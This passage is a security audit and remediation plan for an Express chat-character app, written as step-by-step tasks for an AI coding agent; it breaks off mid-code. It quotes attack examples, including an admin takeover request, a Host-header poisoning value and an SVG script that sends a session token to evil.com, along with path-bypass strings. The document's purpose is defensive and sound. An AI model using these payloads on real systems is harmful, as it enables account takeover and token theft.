# My C.AI Universe — Security Vulnerability Audit & Remediation Guide

**Target Codebase**: `My C.AI Universe` (`v2.6.x` — Express 5 Backend, Turso/LibSQL + SQLite, Vanilla JS Frontend, Next.js Frontend, Python Memory Service)
**Audit Date**: 2026-10-25
**Total Verified Findings**: **15** (`3 Critical`, `6 High`, `4 Medium`, `2 Low`)

---

## Execution Protocol for Gemini 3.8 Flash

When switching to **Gemini 3.8 Flash** to execute this remediation plan, follow these exact rules:

1. **Work Sequentially by Ticket (`[VULN-01]` -> `[VULN-15]`)**:
   - Read the target file lines before editing.
   - Write or run the reproduction test first (`Red`), apply the exact replacement code (`Green`), and run `npm test` after each fix so regressions are caught immediately.
2. **Preserve Existing Test & Architectural Contracts**:
   - `tests/api.test.js` runs 22 end-to-end checks under `NODE_ENV=test`. Pay close attention to the **Test Compatibility Notes** in `[VULN-01]`, `[VULN-02]`, `[VULN-03]`, and `[VULN-09]`.
   - Never replace `ChatSessionRepository.updateMessageFields()` with `.save(session)` for turn updates.
   - Do **not** alter `PERMISSIVE_SAFETY_SETTINGS` (`BLOCK_NONE`) in `backend/ai/providers/gemini.js`.
   - Never commit `.env`, `.sqlite` files, or user-uploaded avatars.
3. **Final Mandatory Post-Fix Steps** (per `.agents/rules/project_workflow.md`):
   - Run `npm test` (all 34+ test suites must exit `0`).
   - Run `graphify update .`
   - Run `npm run audit:pack`
   - Update `PROGRESS.md` with the security hardening milestone, then commit and push to `origin main`.

---

## Severity Matrix

| ID | Severity | OWASP Category | Affected File(s) | Summary |
| :--- | :--- | :--- | :--- | :--- |
| **VULN-01** | **CRITICAL** | A07 Auth Failures | `backend/services/auth.service.js:246-362` | Unauthenticated Account Takeover (incl. Admin) via tokenless/fallback Social Auth & derived-username auto-linking |
| **VULN-02** | **CRITICAL** | A07 Auth Failures | `backend/services/auth.service.js:400-508`, `backend/services/email.service.js:49-111`, `backend/controllers/auth.controller.js:42-50` | Password Reset 6-digit OTP leaked in HTTP response + `Host` header reset link poisoning + email leak + missing OTP brute-force lockout |
| **VULN-03** | **CRITICAL** | A03 Injection / XSS | `backend/routes/auth.route.js:15`, `backend/routes/index.js:34`, `backend/services/auth.service.js:515-592`, `server.js:114-141` | Unauthenticated Stored XSS file upload (`.svg` & arbitrary `image/html` -> `.html`), missing magic-byte verification, & filename traversal risk |
| **VULN-04** | **HIGH** | A01 Broken Access Control | `server.js:163-172, 220-222` | Admin HTML/JS/CSS gatekeeper regex bypassed via duplicate slashes (`GET //admin.html`, `GET /js//admin-page.js`) |
| **VULN-05** | **HIGH** | A01 Broken Access Control | `backend/controllers/memory.controller.js:22-108`, `backend/services/memory.service.js:32-100`, `backend/repositories/MemoryRepository.js:13-22` | Cross-tenant leak of all users' private chat memories & `story_summary` chronicles via `GET /api/memories?characterId=...` |
| **VULN-06** | **HIGH** | A03 Injection / XSS | `frontend/js/auth-page.js:153-190`, `frontend/js/profile-setup-page.js:196-200`, `frontend/js/common.js:475-483`, `frontend/js/chat.js:1550`, `backend/middlewares/security.js:126-135` | Post-login `?return=javascript:...` XSS & Open Redirect, Stored XSS in `renderUserAvatar()`, `javascript:` link XSS in `character.wiki`, & missing CSP |
| **VULN-07** | **HIGH** | A01 Broken Access Control | `backend/models/Character.js:80-89`, `backend/services/auth.service.js:127-133, 218-232, 346-362` | Character ownership hijacking via mutable `@creator` username fallback & missing `@kazuken` reservation in `updateProfile()` / `socialAuth()` |
| **VULN-08** | **HIGH** | A10 SSRF | `backend/config/index.js:37-43`, `backend/services/wiki.service.js:116-153` | SSRF filter bypass via `translate.goog` open proxy, unvalidated HTTP `30x` redirects to internal loopback/metadata IPs, & unbounded response OOM |
| **VULN-09** | **HIGH** | A01 Broken Access Control | `backend/controllers/persona.controller.js:35-52`, `backend/routes/character.route.js:18-31`, `backend/controllers/character.controller.js:37-94, 152-222` | Unauthenticated global default persona overwrite (`POST /api/personas`), unauthenticated Gemini quota drain (`/generate`, `/parse-wiki`), & global `is_liked` race |
| **VULN-10** | **MEDIUM** | A07 Auth Failures | `backend/middlewares/auth.js:14-21`, `nextjs-frontend/lib/auth.ts:19-25, 90-94`, `backend/services/auth.service.js:56-109, 493-508`, `server.js:86` | Malformed cookie `%E0` crashes server with HTTP 500 (`decodeURIComponent`), JWTs remain valid after password reset, logout leaves cookie intact, & form-CSRF surface |
| **VULN-11** | **MEDIUM** | A04 Insecure Design | `server.js:54-56`, `backend/middlewares/security.js:1-3, 18-86` | `X-Forwarded-For` IP spoofing bypasses rate limiters when `TRUST_PROXY=true` + unbounded `RateLimiter.hits` Map memory exhaustion |
| **VULN-12** | **MEDIUM** | A02 Crypto Failures | `backend/models/UserPersona.js:11`, `backend/repositories/PersonaRepository.js:85-100`, `backend/models/User.js:13`, `backend/models/ChatSession.js:24,69,75`, `backend/models/CharacterMemory.js:11`, `backend/services/auth.service.js:424` | `persona_${Date.now()}` ID collision + `ON CONFLICT DO UPDATE SET user_id` overwrites another user's persona; `Math.random()` used for security IDs |
| **VULN-13** | **MEDIUM** | A06 Vulnerable Components | `package.json`, `nextjs-frontend/package.json` | Known CVEs in dependencies: `next@14.2.24` (**Critical CVE-2025-29927**), `undici`, `body-parser`, `nodemailer` |
| **VULN-14** | **LOW** | A05 Security Misconfig | `server.js:94-106, 238-246`, `backend/controllers/BaseController.js:52-58` | Express 5 `RangeError` crash when `error.code` is a string (`'SQLITE_CONSTRAINT'`) + internal DB engine URL & row stats leaked on `/api/health` and HTTP 500s |
| **VULN-15** | **LOW** | A05 Security Misconfig | `.gitignore`, `nextjs-frontend/public/assets/avatars/avatar_*`, `backend/config/index.js:25` | 19 user-uploaded avatar files tracked in Git under `nextjs-frontend/public/assets/avatars/` + hardcoded developer Google Client ID fallback |

---

## Detailed Findings & Step-by-Step Fixes

---

### [VULN-01] Unauthenticated Account Takeover (incl. Admin) via Social Auth Bypass
- **Severity**: **CRITICAL** (CVSS 9.8)
- **Location**:
  - `backend/services/auth.service.js:246-362`
  - `backend/controllers/auth.controller.js:25-40`
  - `tests/api.test.js:748-763`

#### What Was Found
1. `AuthService.socialAuth({ provider, email, name, providerId, avatar, token })` accepts `email` and `providerId` directly from `req.body` and treats `token` as **optional** (`if (token && cleanProvider === 'google')`).
2. Even when `token` is provided, if `fetch` to Google/Facebook returns non-OK or throws, the `catch` block only logs `console.warn` and continues execution using the attacker-supplied `email` from `req.body`.
3. Lines `305-313` search `findByEmail(verifiedEmail)` **and** `findByUsername(derivedUsername)` (where `derivedUsername = verifiedEmail.split('@')[0]`), overwrite `user.authProvider`, and return a valid 14-day JWT (`issueToken(user)`).
4. **Exploit**: An unauthenticated attacker sends:
   ```json
   POST /api/auth/social
   {"provider": "google", "email": "<admin_username>@gmail.com", "providerId": "1"}
   ```
   The server matches the admin account via `derivedUsername`, logs the attacker in as `admin`, and returns a valid admin JWT without any password or OAuth token.
5. Even when a real Google token is supplied, `payload.aud === config.GOOGLE_CLIENT_ID` and `payload.email_verified` are not verified, allowing tokens issued for unrelated Google OAuth apps to authenticate.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-01-social-auth-bypass.test.js` asserting that `POST /api/auth/social` without a valid `token` returns HTTP `401`, and that a social login never hijacks an existing `local` account by matching `email.split('@')[0]`.
- [ ] **Step 2**: Replace `socialAuth` and `#generateUniqueSocialUsername` in `backend/services/auth.service.js:246-362` with strict token verification:
  - Require a non-empty `token` string.
  - In `NODE_ENV === 'test'` **only**, allow explicit test token `'test_mock_google_oauth_token'` (so `tests/api.test.js` runs offline without hitting Google servers), and still forbid linking to existing `local` accounts.
  - Verify `payload.aud === config.GOOGLE_CLIENT_ID` (when `GOOGLE_CLIENT_ID` is configured) and `(payload.email_verified === true || payload.email_verified === 'true')`.
  - Throw `UnauthorizedError` immediately if Google/Facebook token verification fails.
  - Never match existing users by `derivedUsername` (`email.split('@')[0]`), and only link to an existing email if `user.authProvider === cleanProvider` (do not silently overwrite password-based `local` accounts).

```javascript
  /**
   * Authenticate or register a user via Google or Facebook OAuth
   * Strictly verifies cryptographic provider token before trusting identity claims.
   */
  async socialAuth({ provider, email, name, providerId, avatar, token } = {}) {
    const cleanProvider = String(provider || '').trim().toLowerCase();
    if (!['google', 'facebook'].includes(cleanProvider)) {
      throw new ValidationError('Unsupported social authentication provider', 'provider');
    }

    if (!token || typeof token !== 'string' || !token.trim()) {
      throw new UnauthorizedError('Valid OAuth provider token is required');
    }

    let verifiedEmail = '';
    let verifiedName = '';
    let verifiedAvatar = '';
    let verifiedProviderId = '';

    // Offline deterministic mock strictly gated to automated test suite
    if (
      config.IS_TEST &&
      token === 'test_mock_google_oauth_token' &&
      cleanProvider === 'google'
    ) {
      verifiedEmail = String(email || '').trim().toLowerCase();
      verifiedName = String(name || '').trim();
      verifiedAvatar = String(avatar || '').trim();
      verifiedProviderId = String(providerId || '').trim();
    } else if (cleanProvider === 'google') {
      let tokenRes;
      try {
        const isJwtIdToken = token.split('.').length === 3;
        const verifyEndpoint = isJwtIdToken
          ? `https://oauth2.googleapis.com/tokeninfo?id_token=${encodeURIComponent(token)}`
          : `https://www.googleapis.com/oauth2/v3/userinfo`;
        const fetchOpts = isJwtIdToken
          ? {}
          : { headers: { Authorization: `Bearer ${token}` } };

        tokenRes = await fetch(verifyEndpoint, fetchOpts);
      } catch {
        throw new UnauthorizedError('Failed to contact Google OAuth verification service');
      }

      if (!tokenRes.ok) {
        throw new UnauthorizedError('Invalid or expired Google OAuth token');
      }

      const payload = await tokenRes.json().catch(() => null);
      if (!payload || !payload.email) {
        throw new UnauthorizedError('Google OAuth token did not return a valid email');
      }

      const emailVerified = payload.email_verified === true || payload.email_verified === 'true';
      if (!emailVerified) {
        throw new UnauthorizedError('Google account email is not verified');
      }

      if (payload.aud && config.GOOGLE_CLIENT_ID && payload.aud !== config.GOOGLE_CLIENT_ID) {
        throw new UnauthorizedError('Google OAuth token audience mismatch');
      }

      verifiedEmail = String(payload.email).trim().toLowerCase();
      verifiedName = String(payload.name || '').trim();
      verifiedAvatar = String(payload.picture || '').trim();
      verifiedProviderId = String(payload.sub || '').trim();
    } else if (cleanProvider === 'facebook') {
      let fbRes;
      try {
        fbRes = await fetch(
          `https://graph.facebook.com/me?fields=id,name,email,picture&access_token=${encodeURIComponent(token)}`
        );
      } catch {
        throw new UnauthorizedError('Failed to contact Facebook OAuth verification service');
      }

      if (!fbRes.ok) {
        throw new UnauthorizedError('Invalid or expired Facebook OAuth token');
      }

      const payload = await fbRes.json().catch(() => null);
      if (!payload || !payload.email || !payload.id) {
        throw new UnauthorizedError('Facebook OAuth token did not return a verified email and id');
      }

      verifiedEmail = String(payload.email).trim().toLowerCase();
      verifiedName = String(payload.name || '').trim();
      verifiedAvatar = String(payload.picture?.data?.url || '').trim();
      verifiedProviderId = String(payload.id).trim();
    }

    if (!verifiedEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(verifiedEmail)) {
      throw new ValidationError('Valid verified email address is required from social provider', 'email');
    }

    // Only match by verified email — NEVER by derived username handle
    let user = await this.userRepo.findByEmail(verifiedEmail);

    if (user) {
      // Prevent OAuth pre-hijacking / overwriting a local password account
      if ((user.authProvider || 'local') !== cleanProvider) {
        throw new ValidationError(
          'An account with this email already exists using a different sign-in method. Please sign in with your password.',
          'email'
        );
      }

      let changed = false;
      if (!user.avatar || user.avatar === '👤') {
        if (verifiedAvatar) {
          user.avatar = verifiedAvatar;
          changed = true;
        }
      }
      if (changed) {
        await this.userRepo.save(user);
      }
      const sessionToken = this.issueToken(user);
      return { user: user.toJSON(), token: sessionToken, isNewUser: false };
    }

    const rawHandle = verifiedEmail
      .split('@')[0]
      .replace(/[^a-zA-Z0-9_]/g, '_')
      .replace(/^_+|_+$/g, '')
      .slice(0, 20);
    const baseHandle = rawHandle.length >= 3 ? rawHandle : `${cleanProvider}_user`;
    const uniqueUsername = await this.#generateUniqueSocialUsername(baseHandle);

    const randomSecret = crypto.randomBytes(32).toString('hex');
    const passwordHash = await this.hashPassword(randomSecret);

    const newUser = new User({
      username: uniqueUsername,
      displayName: (verifiedName || uniqueUsername).slice(0, 50),
      email: verifiedEmail,
      avatar: verifiedAvatar || '✨',
      passwordHash,
      role: 'user',
      authProvider: cleanProvider
    });

    await this.userRepo.save(newUser);
    await this.personaRepo.ensureStarterPersonaForUser(newUser);

    const sessionToken = this.issueToken(newUser);
    return { user: newUser.toJSON(), token: sessionToken, isNewUser: true };
  }

  async #generateUniqueSocialUsername(baseHandle) {
    let candidate = baseHandle.toLowerCase();
    if (RESERVED_USERNAMES.has(candidate)) {
      candidate = `${candidate}_user`;
    }
    let attempt = 0;
    while (attempt < 20) {
      const existing = await this.userRepo.findByUsername(candidate);
      if (!existing && !RESERVED_USERNAMES.has(candidate)) return candidate;
      attempt++;
      const suffix = crypto.randomBytes(2).toString('hex');
      candidate = `${baseHandle.slice(0, 18).toLowerCase()}_${suffix}`;
    }
    return `pilot_${crypto.randomBytes(4).toString('hex')}`;
  }
```

- [ ] **Step 3 (Test Compatibility)**: Update `tests/api.test.js:748-763` (Test #18) to verify both that tokenless social auth is blocked (`401`) and that `token: 'test_mock_google_oauth_token'` succeeds in `NODE_ENV=test`:
```javascript
  // 18. Social Authentication (Rejects missing token; accepts verified token)
  const unauthSocialRes = await fetch(`${BASE_URL}/api/auth/social`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      provider: 'google',
      email: `pilot_spec_${Date.now()}@gmail.com`
    })
  });
  if (unauthSocialRes.status !== 401) {
    throw new Error(`Expected 401 for tokenless social auth, got ${unauthSocialRes.status}`);
  }

  const socialRes = await fetch(`${BASE_URL}/api/auth/social`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      provider: 'google',
      token: 'test_mock_google_oauth_token',
      email: `pilot_spec_${Date.now()}@gmail.com`,
      name: 'Google Space Pilot',
      providerId: `g_${Date.now()}`
    })
  });
  const socialData = await assertResponse(socialRes, 'Google Social Auth');
```

---

### [VULN-02] Password Reset OTP Leaked in HTTP Response + Host Header Poisoning + Email Enumeration & Brute-Force
- **Severity**: **CRITICAL** (CVSS 9.8)
- **Location**:
  - `backend/services/email.service.js:49-111`
  - `backend/services/auth.service.js:400-508`
  - `backend/controllers/auth.controller.js:42-50`
  - `backend/config/index.js`
  - `frontend/js/reset-password.js:110-124`

#### What Was Found
1. **Live OTP Returned in HTTP Response**: In `email.service.js:103,110`, whenever SMTP is unconfigured **or** `transporter.sendMail` throws an error (e.g., temporary SMTP rate limit), it returns `{ previewCode: code }`. `auth.service.js:442` returns `previewCode` directly in the JSON response to the unauthenticated caller! Anyone can call `POST /api/auth/forgot-password` for any user, read `previewCode` from the JSON response, and reset their password immediately.
2. **Private Email Disclosure & User Enumeration**: Calling `POST /api/auth/forgot-password` with `{ "email": "some_username" }` resolves the user by username and returns `email: targetEmail` in clear text (`auth.service.js:441`), leaking every user's private email address. Unknown accounts return HTTP `404` instead of a uniform response.
3. **Password Reset Poisoning (`Host` Header Injection)**: `auth.controller.js:45` computes `const baseUrl = `${req.protocol}://${req.get('host')}`` from the untrusted HTTP `Host` header. Sending `Host: evil.com` emails the victim a link `<a href="http://evil.com/reset-password.html?email=...&code=123456">` containing their live OTP in the URL query string!
4. **HTML Injection in Reset Email**: `email.service.js:72` interpolates `<strong>${email}</strong>` without HTML escaping.
5. **Missing OTP Attempt Lockout & Stale OTP Invalidation**: `verifyResetCode` does not count failed guesses per OTP (allowing distributed IPs to brute-force 6 digits), and `requestPasswordReset` leaves previous unused OTPs active.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-02-password-reset-security.test.js` verifying:
  1. When `NODE_ENV !== 'test'`, `previewCode` is **never** present in `requestPasswordReset` output.
  2. `Host: evil.attacker.com` header cannot alter the reset link domain.
  3. After 5 wrong guesses on `verifyResetCode`, the OTP is invalidated (`used = 1`) so even the real code is rejected.
- [ ] **Step 2**: Add `PUBLIC_BASE_URL: process.env.PUBLIC_BASE_URL || 'http://localhost:3000'` to `backend/config/index.js`.
- [ ] **Step 3**: Update `backend/controllers/auth.controller.js:42-50` to stop reading `req.get('host')`:
```javascript
  async forgotPassword(req, res) {
    try {
      const { email } = req.body || {};
      const result = await authService.requestPasswordReset({
        email,
        baseUrl: config.PUBLIC_BASE_URL
      });
      return this.ok(res, result);
    } catch (error) {
      return this.handleError(res, error, 'AuthController.forgotPassword');
    }
  }
```
  *(Import `config` at top of `backend/controllers/auth.controller.js`: `import { config } from '../config/index.js';`)*
- [ ] **Step 4**: Harden `backend/services/email.service.js:49-111` — escape HTML, never return `previewCode` unless `config.IS_TEST` is `true`, and do not include raw OTP in URL query links outside `localhost`/trusted base URL:
```javascript
function escapeHtml(str = '') {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```
  Inside `sendPasswordResetCode({ email, code, baseUrl = '' })`:
  - Sanitize `safeBaseUrl`: parse `new URL(baseUrl || config.PUBLIC_BASE_URL)` and only use `origin`.
  - Escape `${escapeHtml(email)}` and `${escapeHtml(resetLink)}` in the HTML body.
  - On fallback/catch:
    ```javascript
    if (config.IS_TEST) {
      return { delivered: false, previewCode: code };
    }
    return { delivered: false };
    ```
- [ ] **Step 5**: Harden `requestPasswordReset`, `verifyResetCode`, and `resetPassword` in `backend/services/auth.service.js:400-508`:
  - Track per-email failed OTP attempts in an in-memory `Map` (or invalidate all active codes for `targetEmail` in SQL after `5` failed `verifyResetCode` attempts: `UPDATE password_resets SET used = 1 WHERE email = ? COLLATE NOCASE AND used = 0`).
  - Before inserting a new OTP in `requestPasswordReset`, invalidate any previous unused codes for that email (`UPDATE password_resets SET used = 1 WHERE email = ? COLLATE NOCASE AND used = 0`).
  - Use `crypto.randomUUID()` for `resetId` (`reset_${crypto.randomUUID()}`) instead of `Math.random()`.
  - Mask `email` in the response when queried by username (only return `previewCode` when `config.IS_TEST` is `true`, keeping `tests/api.test.js:785` green!).
  - Remove the client-side `if (res.previewCode)` auto-fill banner in `frontend/js/reset-password.js:110-124`.

---

### [VULN-03] Unauthenticated Stored XSS File Upload (`.svg` / `.html`) + Missing Magic-Byte & Filename Validation
- **Severity**: **CRITICAL** (CVSS 9.6)
- **Location**:
  - `backend/routes/auth.route.js:15`
  - `backend/routes/index.js:34`
  - `backend/services/auth.service.js:515-592`
  - `server.js:114-141`
  - `tests/api.test.js:843-858`

#### What Was Found
1. **Unauthenticated Upload Endpoints**: Both `POST /api/auth/upload-avatar` (`auth.route.js:15`) and `POST /api/upload/avatar` (`routes/index.js:34`) lack `requireAuth` and upload-specific rate limiting. Any anonymous bot can flood Turso `media_assets` and local disk with 5MB blobs at 120 req/min (600 MB/min).
2. **Stored XSS via SVG & Arbitrary `image/<ext>` Fallback**: In `auth.service.js:534-545`:
   ```javascript
   } else if (sub === 'svg+xml') {
     ext = 'svg';
     mimeType = 'image/svg+xml';
   } else {
     ext = sub.replace(/[^a-z0-9]/g, '') || 'jpg';
     mimeType = `image/${sub}`;
   }
   ```
   - Uploading `data:image/svg+xml;base64,...` writes `.svg` containing `<script>fetch('https://evil.com/?t='+localStorage.cai_auth_token)</script>`. Navigating to `/assets/avatars/avatar_....svg` executes arbitrary JS on the application origin!
   - Worse, uploading `data:image/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` hits the `else` branch, sets `ext = 'html'`, writes `frontend/assets/avatars/avatar_....html`, and `express.static(frontendDir)` serves it as `text/html`!
3. **No Magic-Byte Verification**: Only the attacker-controlled `data:image/...` string prefix is checked; raw HTML/JS bytes disguised with `data:image/png;base64,...` are stored verbatim.
4. **Missing Basename Validation & Sandbox CSP on `/assets/avatars/:filename`**: `server.js:115` reads `req.params.filename` without validating `/^[a-zA-Z0-9_-]+\.(jpg|png|webp|gif)$/i` before `path.join` and `fs.writeFileSync`, and serves DB blobs without `Content-Security-Policy: default-src 'none'; sandbox` or `X-Content-Type-Options: nosniff`.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-03-avatar-upload-xss.test.js` verifying:
  1. Unauthenticated `POST /api/auth/upload-avatar` returns `401`.
  2. Authenticated upload of `data:image/svg+xml;base64,...`, `data:image/html;base64,...`, or fake PNG header (`data:image/png;base64,PHNjcmlwdD4=`) returns `400`.
  3. `GET /assets/avatars/..%5cserver.js` returns `400`/`404`.
- [ ] **Step 2**: Add `requireAuth` and a dedicated upload rate limiter (`10 uploads / 5 minutes`) to `backend/routes/auth.route.js:15` and `backend/routes/index.js:34`:
```javascript
// In backend/middlewares/security.js:
export const uploadRateLimiter = new RateLimiter({
  windowMs: 5 * 60 * 1000,
  maxRequests: 15,
  message: 'Too many image uploads. Please wait a few minutes.'
});

// In backend/routes/auth.route.js:
router.post('/upload-avatar', requireAuth, uploadRateLimiter.middleware(), (req, res) => authController.uploadAvatar(req, res));

// In backend/routes/index.js:
router.post('/upload/avatar', requireAuth, uploadRateLimiter.middleware(), (req, res) => authController.uploadAvatar(req, res));
```
- [ ] **Step 3**: Replace `saveBase64Avatar` in `backend/services/auth.service.js:518-592` with strict raster allowlisting + binary magic-byte inspection:
```javascript
  static #detectRasterMagicBytes(buffer) {
    if (!Buffer.isBuffer(buffer) || buffer.length < 12) return null;
    // PNG: 89 50 4E 47 0D 0A 1A 0A
    if (
      buffer[0] === 0x89 &&
      buffer[1] === 0x50 &&
      buffer[2] === 0x4e &&
      buffer[3] === 0x47 &&
      buffer[4] === 0x0d &&
      buffer[5] === 0x0a &&
      buffer[6] === 0x1a &&
      buffer[7] === 0x0a
    ) {
      return { ext: 'png', mimeType: 'image/png' };
    }
    // JPEG: FF D8 FF
    if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) {
      return { ext: 'jpg', mimeType: 'image/jpeg' };
    }
    // GIF: GIF87a or GIF89a
    if (
      buffer[0] === 0x47 &&
      buffer[1] === 0x49 &&
      buffer[2] === 0x46 &&
      buffer[3] === 0x38 &&
      (buffer[4] === 0x37 || buffer[4] === 0x39) &&
      buffer[5] === 0x61
    ) {
      return { ext: 'gif', mimeType: 'image/gif' };
    }
    // WEBP: RIFF....WEBP
    if (
      buffer[0] === 0x52 &&
      buffer[1] === 0x49 &&
      buffer[2] === 0x46 &&
      buffer[3] === 0x46 &&
      buffer[8] === 0x57 &&
      buffer[9] === 0x45 &&
      buffer[10] === 0x42 &&
      buffer[11] === 0x50
    ) {
      return { ext: 'webp', mimeType: 'image/webp' };
    }
    return null;
  }

  async saveBase64Avatar(dataUrl) {
    if (!dataUrl || typeof dataUrl !== 'string') {
      throw new ValidationError('Valid base64 image data is required', 'image');
    }

    const match = dataUrl.match(/^data:image\/(png|jpeg|jpg|webp|gif);base64,([A-Za-z0-9+/=\s]+)$/i);
    if (!match) {
      throw new ValidationError('Only PNG, JPEG, WEBP, and GIF raster images are allowed', 'image');
    }

    const base64Data = match[2].replace(/\s+/g, '');
    const buffer = Buffer.from(base64Data, 'base64');

    if (buffer.length > 5 * 1024 * 1024) {
      throw new ValidationError('Avatar image size must be under 5MB', 'image');
    }

    const detected = AuthService.#detectRasterMagicBytes(buffer);
    if (!detected) {
      throw new ValidationError('Invalid or corrupted image file signature', 'image');
    }

    const { ext, mimeType } = detected;
    const filename = `avatar_${Date.now()}_${crypto.randomBytes(8).toString('hex')}.${ext}`;
    const publicUrl = `/assets/avatars/${filename}`;

    const db = getDatabase();
    await db.prepare(`
      INSERT INTO media_assets (filename, mime_type, data)
      VALUES (?, ?, ?)
      ON CONFLICT(filename) DO UPDATE SET mime_type = excluded.mime_type, data = excluded.data
    `).run(filename, mimeType, base64Data);

    try {
      const avatarsDir = path.join(config.ROOT_DIR, 'frontend', 'assets', 'avatars');
      if (!fs.existsSync(avatarsDir)) {
        fs.mkdirSync(avatarsDir, { recursive: true });
      }
      fs.writeFileSync(path.join(avatarsDir, filename), buffer);
    } catch {
      // Cloud read-only container fallback uses media_assets SQL table
    }

    return publicUrl;
  }
```
- [ ] **Step 4**: Harden `/assets/avatars/:filename` in `server.js:114-141`:
```javascript
    const SAFE_AVATAR_FILENAME = /^[a-zA-Z0-9_-]+\.(png|jpg|jpeg|webp|gif)$/i;
    const ALLOWED_AVATAR_MIMES = new Set(['image/png', 'image/jpeg', 'image/webp', 'image/gif']);

    this.app.get('/assets/avatars/:filename', async (req, res) => {
      const rawFilename = String(req.params.filename || '');
      if (!SAFE_AVATAR_FILENAME.test(rawFilename)) {
        return res.status(400).end();
      }
      res.setHeader('Content-Security-Policy', "default-src 'none'; sandbox");
      res.setHeader('X-Content-Type-Options', 'nosniff');

      const localPath = path.join(frontendDir, 'assets', 'avatars', rawFilename);
      if (fs.existsSync(localPath)) {
        return res.sendFile(localPath);
      }
      try {
        const db = getDatabase();
        const row = await db.prepare('SELECT mime_type, data FROM media_assets WHERE filename = ?').get(rawFilename);
        if (row && row.data) {
          const safeMime = ALLOWED_AVATAR_MIMES.has(row.mime_type) ? row.mime_type : 'application/octet-stream';
          const imgBuffer = Buffer.from(row.data, 'base64');
          try {
            const avatarsDir = path.dirname(localPath);
            if (!fs.existsSync(avatarsDir)) fs.mkdirSync(avatarsDir, { recursive: true });
            fs.writeFileSync(localPath, imgBuffer);
          } catch {}
          res.setHeader('Content-Type', safeMime);
          res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
          return res.send(imgBuffer);
        }
      } catch (err) {
        console.error('[MediaAssets] Failed to load avatar from DB:', err.message);
      }
      return res.status(404).end();
    });
```
- [ ] **Step 5 (Test Compatibility)**: Update `tests/api.test.js:844-848` (Test #21) to include `'Authorization': \`Bearer \${pilotAuth.token}\`` in the upload request headers (and optionally assert `401` without a token first).

---

### [VULN-04] Admin Static Asset Gatekeeper Regex Bypass (`//admin.html`, `/js//admin-page.js`)
- **Severity**: **HIGH** (CVSS 7.5)
- **Location**: `server.js:163-172`, `server.js:220-222`

#### What Was Found
`server.js:164` guards admin HTML/JS/CSS before `express.static(frontendDir)` using:
```javascript
if (/^\/(admin(\.html)?|js\/admin-page\.js|css\/admin\.css)$/i.test(req.path)) {
  return requireAdminWebAccess(req, res, next);
}
```
`req.path` in Express is **not** normalized for repeated slashes, backslashes, or Windows trailing dots. Requesting `GET //admin.html`, `GET /js//admin-page.js`, `GET /css//admin.css`, or `GET /admin.html.` fails the regex (`false`), skips `requireAdminWebAccess`, and `express.static` normalizes the filesystem path and serves the restricted admin HTML, JS, and CSS directly to unauthenticated users! In addition, lines `220-222` register a duplicate `this.app.get(['/admin', '/admin.html'], ...)` route without `requireAdminWebAccess`.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-04-admin-gatekeeper-bypass.test.js` asserting that `GET //admin.html`, `GET /js//admin-page.js`, and `GET /css//admin.css` return `302` or `403` (never `200`) for unauthenticated and non-admin callers.
- [ ] **Step 2**: Normalize `req.path` before checking admin paths in `server.js:163-172` and add `requireAdminWebAccess` to `server.js:220-222`:
```javascript
    // Normalize duplicate slashes, backslashes, and trailing Windows NTFS dots/spaces before gating admin assets
    this.app.use((req, res, next) => {
      const normalizedPath = path.posix
        .normalize(String(req.path || '/').replace(/\\/g, '/'))
        .replace(/\/+/g, '/')
        .replace(/[.\s]+$/, '');

      if (/^\/(admin(\.html)?|js\/admin-page\.js|css\/admin\.css)$/i.test(normalizedPath)) {
        return requireAdminWebAccess(req, res, next);
      }
      return next();
    });
```
  And at `server.js:220-222`:
```javascript
    this.app.get(['/admin', '/admin.html'], requireAdminWebAccess, (req, res) => {
      res.sendFile(path.join(frontendDir, 'admin.html'));
    });
```

---

### [VULN-05] Cross-Tenant Private Chat Memory & Story Summary Leak (`GET /api/memories`)
- **Severity**: **HIGH** (CVSS 8.2)
- **Location**:
  - `backend/controllers/memory.controller.js:22-108`
  - `backend/services/memory.service.js:32-100`
  - `backend/repositories/MemoryRepository.js:13-33`

#### What Was Found
1. During private chats, `MemoryService.detectAndStoreFromTurn()` and `updateRollingStorySummary()` store personal facts (`source = 'conversation'`) and rolling 12-turn plot summaries (`source = 'story_summary'`) in `character_memories` tagged with `session_id`.
2. However, `GET /api/memories?characterId=<id>` uses `optionalAuth` and calls `memoryService.getMemories(characterId)` -> `MemoryRepository.findAll(characterId)`, which executes:
   ```sql
   SELECT * FROM character_memories WHERE character_id = ? ORDER BY created_at DESC
   ```
   with **zero `session_id` or user ownership filtering**!
3. **Exploit**: Any unauthenticated visitor can call `GET /api/memories?characterId=1767000000001` (e.g., Kana Arima or Satoru Gojo) and download **every private conversation memory and `story_summary` plot recap of every user on the platform**!
4. Additionally, `memoryService.addMemory()` calls `this.repository.findAll(characterId)` to deduplicate across all users' private sessions, and `memory.controller.js:95` (`deleteMemory`) checks `character.canModify(req.user)` instead of checking whether the memory belongs to `req.user`'s own `session_id` (letting character creators delete/inspect users' private session memories, while blocking regular users from deleting auto-extracted memories in their own chat sessions!).

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-05-memory-isolation.test.js` where User A stores a session-scoped memory (`session_id = sessionA`) and a `story_summary`, and verify that User B and anonymous callers querying `GET /api/memories?characterId=...` (with or without `sessionId=sessionA`) **never** receive User A's session memories or `storySummary`.
- [ ] **Step 2**: Update `MemoryService.getMemories` and `MemoryService.addMemory` in `backend/services/memory.service.js:32-100` to strictly scope by verified `sessionId` using `this.repository.findForContext(characterId, verifiedSessionId)` (so when `verifiedSessionId` is `null`, **only** global canon memories `session_id IS NULL AND source != 'story_summary'` are returned!):
```javascript
  async addMemory(characterId, content, source = 'manual', importance = 2, sessionId = null) {
    const clean = (content || '').trim();
    if (!clean) {
